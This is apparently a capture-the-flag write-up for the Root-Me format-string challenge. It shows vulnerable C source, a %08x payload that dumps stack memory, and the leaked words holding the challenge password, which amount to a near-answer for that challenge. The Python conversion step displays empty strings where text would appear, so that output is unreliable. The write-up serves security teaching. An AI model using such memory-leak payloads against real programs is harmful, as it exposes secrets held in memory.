# ELF x86 - Format string bug basic 1

- Problem: https://www.root-me.org/en/Challenges/App-System/ELF-x86-Format-string-bug-basic-1

We can see the source code as follows.
```
#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]){
        FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
        char buffer[32];
        fgets(buffer, sizeof(buffer), secret);
        printf(argv[1]);
        fclose(secret);
        return 0;
}
```

We can see that there is a formatstring bug in the printf(argv[1]) part.
```
app-systeme-ch5@challenge02:~$ ./ch5 %08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x
00000020-0804b160-0804853d-00000009-bffffc79-b7e1c589-bffffb24-b7fc4000-b7fc4000-0804b160-39617044-28293664-6d617045-bf000a64-0804861b

```
The guessed part of .passwd is:
39617044-28293664-6d617045-bf000a64-0804861b

We converted these bytes into string as follows.
```
Type "help", "copyright", "credits" or "license" for more information.
>>> a = "\x44\x70\x61\x39"
>>> str(a)
''

>>> b = "\x64\x36\x29\x28"
>>> str(b)
''

>>> c = "\x45\x70\x61\x6d"
>>> str(c)
''

>>> d = "\x64\x0a\x00\xbf"
>>> str(d)
''
```
